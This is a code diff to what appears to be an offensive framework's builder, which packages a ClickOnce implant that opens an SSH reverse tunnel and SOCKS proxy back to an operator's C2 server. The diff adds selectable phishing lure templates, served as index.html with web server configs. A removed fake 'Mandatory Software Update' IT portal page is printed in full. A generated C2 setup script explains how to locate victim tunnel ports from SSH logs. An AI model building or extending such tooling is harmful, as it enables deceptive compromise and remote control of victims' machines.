@@ -1,6 +1,8 @@
 """
 BoltholeBuilder — builds ClickOnce packages with the Bolthole SSH-tunnel payload.
 """
+import base64
+import json
 import os
 import re
 import random
@@ -25,6 +27,9 @@ from .consts import (
     BOLTHOLE_BUILD_CMD,
     BOLTHOLE_SIDELOAD_OPTIONS,
     DATA_CS_SIZE_IN_MB,
+    PHISH_TEMPLATE_DIR,
+    WEBSERVER_CONFIG_DIR,
+    ALLOWED_PHISH_TEMPLATES,
     TZSYNC, PERFWATSON, SVCHUB, POWERSHELL,
 )
 
@@ -59,11 +64,28 @@ class BoltholeBuilder:
 
     @property
     def _bolt_key(self) -> str:
-        return f"{self.payload.files_prefix}_key"
+        # Named {prefix}d-hostkey (e.g. coolerd-hostkey) to prevent collision with
+        # {ssh_user}_key (the outbound connection key) when files_prefix == ssh_user.
+        return f"{self.payload.files_prefix}d-hostkey"
 
     @property
     def _boltd_config(self) -> str:
         return f"{self.payload.files_prefix}d-config"
+
+    def _parse_tunnel_range(self) -> tuple:
+        """Parse tunnel_port_range string into (start, end) ints. Raises on bad format."""
+        r = self.payload.tunnel_port_range.strip()
+        try:
+            if '-' in r[1:]:
+                s, e = r.split('-', 1)
+                return int(s.strip()), int(e.strip())
+            v = int(r)
+            return v, v
+        except ValueError as exc:
+            raise ValueError(
+                f"tunnel_port_range '{self.payload.tunnel_port_range}' is not a valid port or range "
+                f"(expected e.g. '31332' or '31332-31345')"
+            ) from exc
 
     def verify(self):
         if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
@@ -92,8 +114,13 @@ class BoltholeBuilder:
             if not 1 <= p <= 65535:
                 raise Exception(f"Port {p} is out of valid range 1-65535")
 
-        if not 1 <= self.payload.tunnel_port <= 65535:
-            raise Exception("tunnel_port out of valid range")
+        ts, te = self._parse_tunnel_range()
+        if not (1 <= ts <= 65535 and 1 <= te <= 65535):
+            raise Exception("tunnel_port_range contains an out-of-range port")
+        if ts > te:
+            raise Exception("tunnel_port_range start must be <= end")
+        if te - ts > 63:
+            raise Exception("tunnel_port_range too wide (max 64 ports)")
 
         if not 1 <= self.payload.socks_port <= 65535:
             raise Exception("socks_port out of valid range")
@@ -121,6 +148,12 @@ class BoltholeBuilder:
             new_path = os.path.join(boltfiles_dst, new)
             if os.path.exists(old_path) and old_path != new_path:
                 os.rename(old_path, new_path)
+        # Replace template icon if a custom one was supplied
+        if self.payload.icon:
+            icon_path = os.path.join(self.temp_dir, "icon.ico")
+            with open(icon_path, "wb") as f:
+                f.write(base64.b64decode(self.payload.icon))
+            self.logger.debug("Replaced icon.ico with custom upload")
         self.logger.debug("Copied template files to %s", self.temp_dir)
 
     def _generate_keypair(self, suffix: str, key_type: str = "ecdsa", bits: int = 256) -> tuple[str, str]:
@@ -198,8 +231,11 @@ class BoltholeBuilder:
         content = content.replace("REPLACE_SSH_HOST", self.payload.ssh_host)
         content = content.replace("REPLACE_USERNAME", self.payload.ssh_user)
         content = content.replace("REPLACE_PORT_ARRAY", port_array)
+        ts, te = self._parse_tunnel_range()
+        tunnel_port_array = ", ".join(str(p) for p in range(ts, te + 1))
         content = content.replace("REPLACE_SOCKS_PORT", str(self.payload.socks_port))
-        content = content.replace("REPLACE_TUNNEL_PORT", str(self.payload.tunnel_port))
+        content = content.replace("REPLACE_TUNNEL_PORT_ARRAY", tunnel_port_array)
+        content = content.replace("REPLACE_BOLTD_LOCAL_PORT", str(ts))
         content = content.replace(
             "REPLACE_STARTUP_DELAY_MS", str(self.payload.startup_delay * 1000)
         )
@@ -218,14 +254,15 @@ class BoltholeBuilder:
         self.logger.debug("Templated Program.cs")
 
         # Write boltd-config
+        ts, _ = self._parse_tunnel_range()
         boltd_config_path = os.path.join(self.temp_dir, self._files_dir_name, self._boltd_config)
         with open(boltd_config_path, "w") as f:
-            f.write(f"Port {self.payload.tunnel_port}\n")
+            f.write(f"Port {ts}\n")
             f.write("ListenAddress 127.0.0.1\n")
             f.write("PubkeyAuthentication yes\n")
             f.write("PasswordAuthentication no\n")
             f.write("IgnoreRhosts yes\n")
-        self.logger.debug("Wrote boltd-config with port %d", self.payload.tunnel_port)
+        self.logger.debug("Wrote boltd-config with port %d (range start)", ts)
 
         # Write the global outbound private key as {ssh_user}_key.
         # Always ensure a single trailing newline: Windows OpenSSH reports "invalid format" without it.
@@ -406,19 +443,47 @@ class BoltholeBuilder:
         with open(app_src, "r") as f:
             app_tmpl = f.read()
 
+        # Construct the canonical deploymentProvider URL.  The zip places all ClickOnce
+        # files under clickonce/, so the operator's base hosting URL must have that path
+        # appended.  Accept either a bare base URL ("https://host.com") or a full path
+        # already containing clickonce/ — detect the latter and use as-is.
+        base_url = self.payload.provider_url.rstrip('/')
+        if base_url:
+            if f"/clickonce/{self.payload.name}.application" in base_url:
+                canonical_url = base_url
+            else:
+                canonical_url = f"{base_url}/clickonce/{self.payload.name}.application"
+        else:
+            canonical_url = ""
+
         app_path = os.path.join(self.build_dir, f"{self.payload.name}.application")
         with open(app_path, "w") as f:
             f.write(
                 Template(app_tmpl).safe_substitute(
                     clickonce_name=self.payload.name,
                     version=self.payload.version,
-                    provider_url=self.payload.provider_url,
+                    provider_url=canonical_url,
                     manifest_size=sz(manifest_path),
+                    publisher=self.payload.publisher,
+                    description=self.payload.description or self.payload.name,
                 )
             )
         self.logger.debug("Wrote application: %s", app_path)
 
     def zip_package(self):
+        """Package build artifacts.
+
+        Zip layout:
+          index.html          ← phishing lure page
+          web.config          ┐
+          .htaccess           │ server configs at root
+          nginx-mime.conf     │
+          Caddyfile-mime      ┘
+          clickonce/          ← all ClickOnce / deploy files
+            *.application
+            *.manifest
+            *.deploy (flat + BoltFiles/ subfolder)
+        """
         target_extensions = (".deploy", ".manifest", ".application")
         source_path = Path(self.build_dir)
         matching_files = []
@@ -430,98 +495,65 @@ class BoltholeBuilder:
 
         output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
         with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
+            # ClickOnce deployment files → clickonce/ subfolder
             for file_path in matching_files:
                 if file_path.is_file():
                     relative_path = file_path.relative_to(source_path)
-                    zf.write(file_path, relative_path)
+                    zf.write(file_path, os.path.join("clickonce", str(relative_path)))
                     os.remove(file_path)
-                    self.logger.debug("Zipped: %s", relative_path)
+                    self.logger.debug("Zipped clickonce/%s", relative_path)
 
-        self.logger.info(
-            "Created %s with %d files", output_zip, len(matching_files)
-        )
+            # Phish / lure page → root as index.html (remove from build_dir so it doesn't shadow directory listing)
+            phish_path = os.path.join(self.build_dir, "phish.html")
+            if os.path.isfile(phish_path):
+                zf.write(phish_path, "index.html")
+                os.remove(phish_path)
+                self.logger.debug("Zipped phish.html → index.html")
+
+            # Web server MIME configs → root
+            if os.path.isdir(WEBSERVER_CONFIG_DIR):
+                for fname in os.listdir(WEBSERVER_CONFIG_DIR):
+                    src = os.path.join(WEBSERVER_CONFIG_DIR, fname)
+                    if os.path.isfile(src):
+                        zf.write(src, fname)
+                        self.logger.debug("Added server config: %s", fname)
+
+        self.logger.info("Created %s with %d ClickOnce files", output_zip, len(matching_files))
 
     def generate_phish_page(self):
-        html = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IT Service Portal</title>
-    <style>
-        body {{
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #f0f2f5;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }}
-        .card {{
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.12);
-            padding: 48px 40px;
-            max-width: 480px;
-            width: 100%;
-            text-align: center;
-        }}
-        .logo {{
-            font-size: 2rem;
-            font-weight: 700;
-            color: #0078d4;
-            margin-bottom: 8px;
-        }}
-        h1 {{
-            font-size: 1.4rem;
-            color: #1a1a1a;
-            margin: 0 0 12px;
-        }}
-        p {{
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 32px;
-        }}
-        .btn {{
-            display: inline-block;
-            background: #0078d4;
-            color: white;
-            padding: 14px 32px;
-            border-radius: 4px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1rem;
-            transition: background 0.2s;
-        }}
-        .btn:hover {{ background: #005a9e; }}
-        .note {{
-            margin-top: 24px;
-            font-size: 0.82rem;
-            color: #888;
-        }}
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="logo">IT Portal</div>
-        <h1>Mandatory Software Update</h1>
-        <p>A required security update has been approved for deployment on your device.
-           Please install it at your earliest convenience to remain compliant with
-           organizational policy.</p>
-        <a href="{self.payload.provider_url}" class="btn">Download &amp; Install Update</a>
-        <p class="note">This update is digitally signed and verified by your IT department.</p>
-    </div>
-</body>
-</html>"""
+        template_name = self.payload.phish_template
+        if template_name not in ALLOWED_PHISH_TEMPLATES:
+            self.logger.warning(
+                "Unknown phish template '%s', falling back to it_portal", template_name
+            )
+            template_name = "it_portal"
+        template_path = os.path.join(PHISH_TEMPLATE_DIR, f"{template_name}.html")
+        try:
+            with open(template_path, "r", encoding="utf-8") as f:
+                html = f.read()
+        except FileNotFoundError:
+            self.logger.warning("Phish template file not found: %s, using fallback", template_path)
+            fallback = os.path.join(PHISH_TEMPLATE_DIR, "it_portal.html")
+            try:
+                with open(fallback, "r", encoding="utf-8") as f:
+                    html = f.read()
+            except FileNotFoundError as exc:
+                raise FileNotFoundError(
+                    f"Primary phish template '{template_name}' and fallback 'it_portal' both missing"
+                    f" — check {PHISH_TEMPLATE_DIR} is mounted"
+                ) from exc
+        clickonce_link = f"clickonce/{self.payload.name}.application"
+        html = html.replace("{{provider_url}}", clickonce_link)
         phish_path = os.path.join(self.build_dir, "phish.html")
-        with open(phish_path, "w") as f:
+        with open(phish_path, "w", encoding="utf-8") as f:
             f.write(html)
-        self.logger.debug("Wrote phish.html")
+        self.logger.debug("Wrote phish.html using template '%s'", template_name)
 
     def generate_c2_setup(self):
         ports_ufw = " ".join(str(p) for p in self._port_list)
         ports_list_str = ", ".join(str(p) for p in self._port_list)
+        ts, te = self._parse_tunnel_range()
+        tunnel_range_str = f"{ts}-{te}" if ts != te else str(ts)
 
         _, pub = load_keypair()
         c2_public_key = pub.strip() if pub else "# PASTE YOUR OUTBOUND SSH PUBLIC KEY HERE"
@@ -529,15 +561,14 @@ class BoltholeBuilder:
 
         script = f"""#!/usr/bin/env bash
 # Bolthole C2 Setup Script
-# ssh_host : {self.payload.ssh_host}
-# ssh_user : {self.payload.ssh_user}
-# ports    : {ports_list_str}
-# tunnel   : {self.payload.tunnel_port}
-# socks5   : {self.payload.socks_port}
+# ssh_host     : {self.payload.ssh_host}
+# ssh_user     : {self.payload.ssh_user}
+# ports        : {ports_list_str}
+# tunnel_range : {tunnel_range_str}
+# socks5       : {self.payload.socks_port}
 set -e
 
 SSH_USER="{self.payload.ssh_user}"
-TUNNEL_PORT={self.payload.tunnel_port}
 
 echo "[*] Creating user $SSH_USER (nologin shell) ..."
 id "$SSH_USER" &>/dev/null || useradd -m -s /usr/sbin/nologin "$SSH_USER"
@@ -593,8 +624,11 @@ if which ufw &>/dev/null; then
     ufw reload
 fi
 
-echo "[+] Done. When a target connects:"
-echo "    ssh -i operator_key -p $TUNNEL_PORT $SSH_USER@<this-host>"
+echo "[+] Done. When a target connects, read the operator port from the C2 auth log:"
+echo "    journalctl -u ssh | grep 'Invalid user'"
+echo "    Format: Invalid user <win-user>.<machine>.p<PORT> from ..."
+echo "    The .p<PORT> suffix is the dynamic tunnel port — use it to connect:"
+echo "    ssh -i operator_key -p <PORT> $SSH_USER@localhost"
 """
         setup_path = os.path.join(self.build_dir, "c2_setup.sh")
         with open(setup_path, "w") as f:
@@ -604,6 +638,7 @@ echo "    ssh -i operator_key -p $TUNNEL_PORT $SSH_USER@<this-host>"
 
 def bolthole_build_func(buildid: str, payload: BoltholePayload):
     """Background task: orchestrate the full Bolthole build pipeline."""
+    builder = None
     try:
         builder = BoltholeBuilder(buildid, payload)
         builder.logger.debug("%s", payload)
@@ -623,10 +658,25 @@ def bolthole_build_func(buildid: str, payload: BoltholePayload):
         builder.compile_artefacts()
         builder.prepare_files_in_build_dir()
         builder.template_manifests()
+        builder.generate_phish_page()   # must run before zip_package (phish.html goes in zip)
         builder.zip_package()
-        builder.generate_phish_page()
         builder.generate_c2_setup()
+
+        meta_path = os.path.join(builder.build_dir, "build-meta.json")
+        with open(meta_path, "w") as f:
+            json.dump({
+                "type": "bolthole",
+                "name": payload.name,
+                "ssh_host": payload.ssh_host,
+                "ssh_user": payload.ssh_user,
+                "tunnel_port_range": payload.tunnel_port_range,
+                "socks_port": payload.socks_port,
+            }, f)
+
+        builder.logger.info("Build complete")
 
     except Exception as exc:  # pylint: disable=broad-except
         GlobalLogger.error("Bolthole build exception: %s", exc)
         GlobalLogger.error("Traceback: %s", traceback.format_exc())
+        if builder is not None:
+            builder.logger.error("Build failed: %s", exc)
